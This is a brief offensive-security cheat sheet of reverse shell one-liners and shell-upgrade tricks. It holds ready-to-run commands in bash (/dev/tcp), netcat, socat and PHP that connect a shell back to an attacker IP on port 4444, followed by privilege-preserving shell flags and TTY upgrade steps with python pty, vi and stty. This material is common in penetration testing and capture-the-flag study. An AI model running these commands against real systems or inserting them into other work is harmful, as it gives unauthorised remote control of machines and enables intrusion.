Web shells 

Reverse shell commands  
bash
    bash -i >& /dev/tcp/10.6.85.85/4444 0>&1
nc w/ -e (traditional):        
    nc -e /bin/sh 172.16.5.1 4242   
nc openbsd (no -e):     
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.6.85.85 53 >/tmp/f
socat                     
    socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP>:4444
PHP            
   php -r '$sock=fsockopen("10.6.85.85",4444);exec("/bin/sh -i <&3 >&3 2>&3");' 
Also Ruby, Java and Python: Reverse shells cheat sheet    

Nesting shells                
  bash -p    /bin/sh -p 


Upgrading to a pseudo terminal / tty     
    python -c 'import pty;pty.spawn("/bin/bash")' 
    echo os.system('/bin/bash')
    /bin/sh -i
    vi -> :sh or :!UNIX_command
    perl —e 'exec "/bin/sh";'
  
  
  SHELL=/bin/bash script -q /dev/null        Ctrl-Z        stty raw -echo        fg    reset    xterm
